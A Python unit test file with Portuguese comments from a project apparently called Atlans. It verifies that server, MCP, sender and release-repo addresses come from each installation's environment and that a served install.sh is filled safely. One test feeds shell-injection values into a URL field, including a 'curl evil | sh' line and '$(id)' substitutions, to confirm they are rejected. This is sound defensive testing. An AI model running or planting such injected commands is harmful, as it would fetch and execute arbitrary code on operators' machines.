# tests/unit/test_enderecos_da_instalacao.py
"""
Nenhum endereço de uma instalação específica no código: cada um vem do ambiente.

O mesmo código roda na instalação de qualquer pessoa. Antes, a tela de
matrícula mandava rodar `curl https://<site do dono>/executores/install | bash`,
o install.sh trazia o servidor e o repositório do dono como padrão, o MCP só
aceitava o host do dono e o painel buscava o instalador desktop nas releases
dele, em qualquer instalação.

  CONVENÇÃO   o que deriva do FRONTEND_URL (host dos executores, MCP, remetente)
  MATRÍCULA   o OTP volta com os endereços desta instalação
  INSTALADOR  o install.sh servido traz os padrões do servidor que o serve
  DESKTOP     sem DESKTOP_RELEASES_REPO, o painel não oferece o app
"""
from __future__ import annotations

import re
import os
import subprocess
import sys
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.api.routers import executores_router as R
from app.core import config

RAIZ = Path(__file__).resolve().parents[2]
INSTALL_SH = RAIZ / "static" / "install.sh"


# ── CONVENÇÃO ────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("site, agents", [
    ("https://atlans.example.org", "https://agents.atlans.example.org"),
    ("https://Atlans.Example.org:8443/", "https://agents.atlans.example.org"),
    # Sem https não há convenção: o host dos executores é sempre mTLS.
    ("http://atlans.example.org", ""),
    # Sem domínio também não: dev local, IP de rede interna.
    ("http://localhost:3000", ""),
    ("https://app.localhost", ""),
    ("https://10.0.0.5", ""),
    ("https://[::1]:8443", ""),
    ("", ""),
])
def test_host_dos_executores_por_convencao(site, agents):
    assert config.agents_por_convencao(site) == agents


def test_hosts_do_mcp_partem_do_site():
    assert config.hosts_mcp_padrao("https://atlans.example.org") == [
        "atlans.example.org", "atlans.example.org:*", "localhost:*", "127.0.0.1:*",
    ]
    # Sem domínio, só o dev local — nenhum host de outra instalação.
    assert config.hosts_mcp_padrao("http://localhost:3000") == ["localhost:*", "127.0.0.1:*"]


def test_remetente_parte_do_site():
    assert config.remetente_padrao("https://atlans.example.org") == "Atlans <noreply@atlans.example.org>"
    assert config.remetente_padrao("http://10.0.0.5:3000") == "Atlans <noreply@localhost>"


@pytest.mark.parametrize("valor, normalizado", [
    (" https://atlans.example.org/ ", "https://atlans.example.org"),
    ("https://atlans.example.org/sub/", "https://atlans.example.org/sub"),
    # O header Host chega em punycode, e o install.sh só aceita ASCII.
    ("https://Exemplo-Ção.br:8443/", "https://xn--exemplo-o-s2a7b.br:8443"),
    ("http://localhost:3000", "http://localhost:3000"),
])
def test_o_site_sai_sem_espacos_e_com_o_host_em_ascii(valor, normalizado):
    assert config._site_normalizado(valor) == normalizado


def test_dominio_com_acento_vira_punycode_nas_convencoes():
    site = "https://exemplo-ção.br"
    assert config.hosts_mcp_padrao(site)[:2] == ["xn--exemplo-o-s2a7b.br", "xn--exemplo-o-s2a7b.br:*"]
    assert config.agents_por_convencao(site) == "https://agents.xn--exemplo-o-s2a7b.br"
    assert config.remetente_padrao(site) == "Atlans <noreply@xn--exemplo-o-s2a7b.br>"


def test_espaco_no_valor_do_ambiente_nao_estraga_os_derivados():
    """Um espaço colado no secret fazia o MCP responder 421 a tudo e o
    install.sh sair sem o host dos executores."""
    codigo = """
import app.core.config as c
assert c.FRONTEND_URL == "https://atlans.example.org", repr(c.FRONTEND_URL)
assert c.AGENTS_URL == "https://agents.atlans.example.org", repr(c.AGENTS_URL)
assert c.MCP_ALLOWED_HOSTS[:2] == ["atlans.example.org", "atlans.example.org:*"], c.MCP_ALLOWED_HOSTS
"""
    _rodar_com_ambiente(codigo, {"FRONTEND_URL": " https://atlans.example.org/ "})


def test_valores_explicitos_vencem_a_convencao():
    """Cada derivação só preenche o que o ambiente deixou vazio."""
    codigo = """
import app.core.config as c
assert c.AGENTS_URL == "https://executores.outro.org", c.AGENTS_URL
assert c.MCP_ALLOWED_HOSTS == ["mcp.outro.org"], c.MCP_ALLOWED_HOSTS
assert c.RESEND_FROM_EMAIL == "Equipe <x@outro.org>", c.RESEND_FROM_EMAIL
assert c.DESKTOP_RELEASES_REPO == "fulano/atlans", c.DESKTOP_RELEASES_REPO
"""
    _rodar_com_ambiente(codigo, {
        "FRONTEND_URL": "https://atlans.example.org",
        "AGENTS_URL": "https://executores.outro.org/",
        "MCP_ALLOWED_HOSTS": "mcp.outro.org",
        "RESEND_FROM_EMAIL": "Equipe <x@outro.org>",
        "DESKTOP_RELEASES_REPO": "/fulano/atlans/",
    })


def test_repositorio_do_desktop_fora_do_formato_desliga_a_oferta():
    codigo = 'import app.core.config as c\nassert c.DESKTOP_RELEASES_REPO == "", c.DESKTOP_RELEASES_REPO\n'
    _rodar_com_ambiente(codigo, {"DESKTOP_RELEASES_REPO": "https://github.com/fulano/atlans"})


def _rodar_com_ambiente(codigo: str, ambiente: dict[str, str]) -> None:
    """O config é lido no import: cada combinação roda num processo próprio."""
    import os
    import sys

    env = {k: v for k, v in os.environ.items() if k not in (
        "AGENTS_URL", "MCP_ALLOWED_HOSTS", "EMAIL_FROM", "RESEND_FROM_EMAIL", "DESKTOP_RELEASES_REPO",
        "EXECUTOR_REPO_URL", "FRONTEND_URL",
    )}
    env.update(ambiente)
    r = subprocess.run([sys.executable, "-c", codigo], cwd=RAIZ, env=env, capture_output=True, text=True)
    assert r.returncode == 0, r.stderr[-2000:]


# ── MATRÍCULA ────────────────────────────────────────────────────────────────

@pytest.fixture
def api_de_matricula(client, mock_current_user):
    from app.api.dependencies import get_agent_or_404, get_db
    from app.main import app

    async def _db():
        yield MagicMock()

    async def _executor():
        return MagicMock(is_default=False, created_by=mock_current_user.id_hash)

    app.dependency_overrides[get_db] = _db
    app.dependency_overrides[get_agent_or_404] = _executor
    mock_current_user.role = "admin"
    expira = datetime(2026, 10, 2, 12, 0, tzinfo=timezone.utc)
    with patch.object(
        R.executor_enrollment_service, "create_enrollment_otp", AsyncMock(return_value=("otp-x", expira)),
    ):
        yield client
    app.dependency_overrides.pop(get_db, None)
    app.dependency_overrides.pop(get_agent_or_404, None)


async def test_o_otp_volta_com_os_enderecos_desta_instalacao(api_de_matricula, monkeypatch):
    monkeypatch.setattr(config, "AGENTS_URL", "https://agents.atlans.example.org")
    monkeypatch.setattr(config, "FRONTEND_URL", "https://atlans.example.org/")

    resp = await api_de_matricula.post("/executores/exe-1/enroll-otp")

    assert resp.status_code == 201, resp.text
    corpo = resp.json()
    assert corpo["server_url"] == "https://agents.atlans.example.org"
    assert corpo["public_url"] == "https://atlans.example.org"
    assert corpo["otp"] == "otp-x"


async def test_sem_host_dos_executores_o_otp_diz_que_nao_sabe(api_de_matricula, monkeypatch):
    """A tela troca o vazio por um marcador e avisa; nunca por um endereço alheio."""
    monkeypatch.setattr(config, "AGENTS_URL", "")
    monkeypatch.setattr(config, "FRONTEND_URL", "http://localhost:3000")

    resp = await api_de_matricula.post("/executores/exe-1/enroll-otp")

    assert resp.status_code == 201, resp.text
    assert resp.json()["server_url"] == ""


# ── INSTALADOR ───────────────────────────────────────────────────────────────

def _script() -> str:
    return INSTALL_SH.read_text(encoding="utf-8")


def test_o_script_do_repositorio_nao_aponta_para_instalacao_nenhuma():
    script = _script()
    for linha in ('SERVER=""', 'PUBLIC_SERVER=""', 'REPO_URL=""'):
        assert len(re.findall(rf"^{re.escape(linha)}$", script, re.MULTILINE)) == 1, linha
    # As únicas URLs com host de verdade são as páginas de instalação das
    # ferramentas; o resto é placeholder (`https://<site>`, `wss://agents.<domínio>`),
    # que o regex não casa: um host precisa de rótulos completos dos dois lados do ponto.
    hosts = set(re.findall(r"(?:https?|wss?)://([a-z0-9-]+(?:\.[a-z0-9-]+)+)(?![a-z0-9.<-])", script))
    assert hosts <= {"docs.docker.com", "git-scm.com"}, hosts


def test_o_servidor_preenche_os_padroes_com_os_enderecos_dele(monkeypatch):
    monkeypatch.setattr(config, "AGENTS_URL", "https://agents.atlans.example.org")
    monkeypatch.setattr(config, "FRONTEND_URL", "https://atlans.example.org/")
    monkeypatch.setattr(config, "EXECUTOR_REPO_URL", "https://git.example.org/atlans.git")

    saida = R._injetar_enderecos(_script())

    # O executor abre WebSocket: o host dos executores vai como wss://.
    assert re.search(r'^SERVER="wss://agents\.atlans\.example\.org"$', saida, re.MULTILINE)
    assert re.search(r'^PUBLIC_SERVER="https://atlans\.example\.org"$', saida, re.MULTILINE)
    assert re.search(r'^REPO_URL="https://git\.example\.org/atlans\.git"$', saida, re.MULTILINE)


@pytest.mark.parametrize("valor", [
    'https://x.org"; curl evil | sh; echo "',
    "https://x.org/$(id)",
    "https://x.org/`id`",
    "https://x .org",
    "ftp://x.org",
])
def test_valor_fora_do_formato_de_url_nao_entra_no_script(monkeypatch, valor):
    """O valor vai entre aspas num script que o operador roda com bash."""
    monkeypatch.setattr(config, "AGENTS_URL", "")
    monkeypatch.setattr(config, "FRONTEND_URL", "")
    monkeypatch.setattr(config, "EXECUTOR_REPO_URL", valor)

    saida = R._injetar_enderecos(_script())

    assert re.search(r'^REPO_URL=""$', saida, re.MULTILINE)
    assert valor not in saida


def test_sem_configuracao_o_script_sai_sem_padroes(monkeypatch):
    monkeypatch.setattr(config, "AGENTS_URL", "")
    monkeypatch.setattr(config, "FRONTEND_URL", "")
    monkeypatch.setattr(config, "EXECUTOR_REPO_URL", "")

    assert R._injetar_enderecos(_script()) == _script()


@pytest.mark.parametrize("faltando, mensagem", [
    ("SERVER", "--server="),
    ("PUBLIC_SERVER", "--public-server="),
    ("REPO_URL", "--repo="),
])
def test_sem_padrao_nem_flag_o_script_para_e_pede_a_flag(tmp_path, faltando, mensagem):
    """Melhor parar antes do clone do que matricular contra um endereço vazio."""
    preenchido = {
        "SERVER": "wss://agents.atlans.example.org",
        "PUBLIC_SERVER": "https://atlans.example.org",
        "REPO_URL": "https://git.example.org/atlans.git",
    }
    script = _script()
    for var, valor in preenchido.items():
        if var != faltando:
            script = re.sub(rf'^{var}=""$', f'{var}="{valor}"', script, count=1, flags=re.MULTILINE)
    arquivo = tmp_path / "install.sh"
    arquivo.write_text(script, encoding="utf-8")

    r = subprocess.run(
        ["bash", str(arquivo), "--executor-id=exe-1", "--otp=otp-x", f"--dir={tmp_path / 'atlans-executor'}"],
        capture_output=True, text=True, timeout=30,
    )

    assert r.returncode == 1
    assert mensagem in (r.stdout + r.stderr)


def test_reinstalacao_nao_pede_o_repositorio(tmp_path):
    """Com o diretório já clonado, o script atualiza com `git pull`: a URL do
    repositório não faz falta, e um servidor sem EXECUTOR_REPO_URL não pode
    barrar a reinstalação."""
    import os

    script = _script()
    for var, valor in (("SERVER", "wss://agents.atlans.example.org"), ("PUBLIC_SERVER", "https://atlans.example.org")):
        script = re.sub(rf'^{var}=""$', f'{var}="{valor}"', script, count=1, flags=re.MULTILINE)
    arquivo = tmp_path / "install.sh"
    arquivo.write_text(script, encoding="utf-8")
    instalacao = tmp_path / "atlans-executor"
    (instalacao / ".git").mkdir(parents=True)
    # Um docker de mentira, que falha na primeira conferência: o teste só quer
    # passar da validação das flags, sem instalar nada.
    bin_ = tmp_path / "bin"
    bin_.mkdir()
    (bin_ / "docker").write_text("#!/bin/sh\nexit 1\n", encoding="utf-8")
    (bin_ / "docker").chmod(0o755)

    r = subprocess.run(
        ["bash", str(arquivo), "--executor-id=exe-1", "--otp=otp-x", f"--dir={instalacao}"],
        capture_output=True, text=True, timeout=30,
        env={**os.environ, "PATH": f"{bin_}:{os.environ['PATH']}"},
    )

    saida = r.stdout + r.stderr
    assert "--repo=" not in saida
    assert "[1/7]" in saida and r.returncode == 1


# ── DESKTOP ──────────────────────────────────────────────────────────────────

async def test_sem_repositorio_configurado_o_painel_nao_oferece_o_app(monkeypatch):
    monkeypatch.setattr(config, "DESKTOP_RELEASES_REPO", "")
    with patch.object(R.httpx, "AsyncClient") as cliente:
        assert await R._ultima_release_desktop() is None
    cliente.assert_not_called()


async def test_com_repositorio_o_painel_consulta_as_releases_dele(monkeypatch):
    monkeypatch.setattr(config, "DESKTOP_RELEASES_REPO", "fulano/atlans")
    monkeypatch.setattr(R, "_desktop_cache", {"em": 0.0, "dados": None})
    resposta = MagicMock(status_code=200)
    resposta.json.return_value = [{
        "tag_name": "desktop/v2.16.0", "draft": False, "published_at": "2026-10-01T00:00:00Z",
        "assets": [{"name": "Atlans-Setup-2.16.0.exe", "browser_download_url": "https://dl/x.exe", "size": 10}],
    }]
    sessao = MagicMock()
    sessao.get = AsyncMock(return_value=resposta)
    contexto = MagicMock()
    contexto.__aenter__ = AsyncMock(return_value=sessao)
    contexto.__aexit__ = AsyncMock(return_value=False)

    with patch.object(R.httpx, "AsyncClient", return_value=contexto):
        dados = await R._ultima_release_desktop()

    assert sessao.get.await_args.args[0] == "https://api.github.com/repos/fulano/atlans/releases"
    assert dados["versao"] == "2.16.0"


# ── EXECUTOR ─────────────────────────────────────────────────────────────────

@pytest.fixture
def env_do_executor(tmp_path, monkeypatch):
    from executor import _ca_bootstrap

    env = tmp_path / ".env"
    monkeypatch.setenv("EXECUTOR_ENV_PATH", str(env))
    for var in ("EXECUTOR_SERVER_URL", "EXECUTOR_PUBLIC_SERVER_URL"):
        monkeypatch.delenv(var, raising=False)
    monkeypatch.setattr(_ca_bootstrap.sys, "argv", ["executor"])
    return env


def test_o_bootstrap_da_ca_le_o_servidor_do_env_do_executor(env_do_executor):
    """O bootstrap roda antes de o executor carregar o .env: um executor nativo
    (systemd, terminal) com o servidor só no arquivo era dado como «sem servidor»
    e não montava o trust store."""
    from executor import _ca_bootstrap

    env_do_executor.write_text('EXECUTOR_SERVER_URL="wss://agents.atlans.example.org"\n', encoding="utf-8")
    assert _ca_bootstrap._resolve_server_url() == "https://atlans.example.org"


def test_o_ambiente_vence_o_env_do_executor(env_do_executor, monkeypatch):
    from executor import _ca_bootstrap

    env_do_executor.write_text("EXECUTOR_SERVER_URL=wss://agents.atlans.example.org\n", encoding="utf-8")
    monkeypatch.setenv("EXECUTOR_SERVER_URL", "wss://agents.outro.example.org")
    assert _ca_bootstrap._resolve_server_url() == "https://outro.example.org"


def test_sem_servidor_em_lugar_nenhum_nada_e_baixado(env_do_executor):
    from executor import _ca_bootstrap

    env_do_executor.write_text("OUTRA=coisa\n", encoding="utf-8")
    assert _ca_bootstrap._resolve_server_url() == ""


def test_status_sem_servidor_e_erro_de_configuracao(monkeypatch, capsys):
    """Sem servidor não há a quem perguntar: antes saía `rede`, com o erro do
    httpx sobre um protocolo vazio."""
    import json

    from executor import config as cfg
    from executor import status_cli

    monkeypatch.setattr(cfg, "EXECUTOR_ID", "exe-1")
    monkeypatch.setattr(cfg, "SERVER_URL", "")

    assert status_cli._cli_main(["--json"]) == 1
    assert json.loads(capsys.readouterr().out)["codigo"] == "config"


def test_hosts_do_mcp_aceitam_o_site_por_ip():
    # Uma instalação por IP (sem domínio) respondia 421 em /mcp até alguém
    # definir MCP_ALLOWED_HOSTS; as outras convenções continuam sem o IP.
    assert config.hosts_mcp_padrao("https://10.0.0.5")[:2] == ["10.0.0.5", "10.0.0.5:*"]
    assert config.hosts_mcp_padrao("http://10.0.0.5:8000") == ["10.0.0.5", "10.0.0.5:*", "localhost:*", "127.0.0.1:*"]
    assert config.agents_por_convencao("https://10.0.0.5") == ""
    assert config.remetente_padrao("https://10.0.0.5") == "Atlans <noreply@localhost>"


@pytest.mark.parametrize("valor", ["atlans.example.org", "www.atlans.example.org/", "ftp://atlans.example.org"])
def test_frontend_url_sem_esquema_impede_a_api_de_subir(valor):
    # Sem o esquema, a URL passava por todos os portões e desligava as
    # convenções em silêncio (remetente noreply@localhost, MCP sem o host do
    # site, tela de matrícula sem o host dos executores).
    env = {k: v for k, v in os.environ.items() if k != "FRONTEND_URL"}
    env["FRONTEND_URL"] = valor
    r = subprocess.run([sys.executable, "-c", "import app.core.config"], cwd=RAIZ, env=env, capture_output=True, text=True)
    assert r.returncode != 0
    assert "FRONTEND_URL" in r.stderr and "http://" in r.stderr
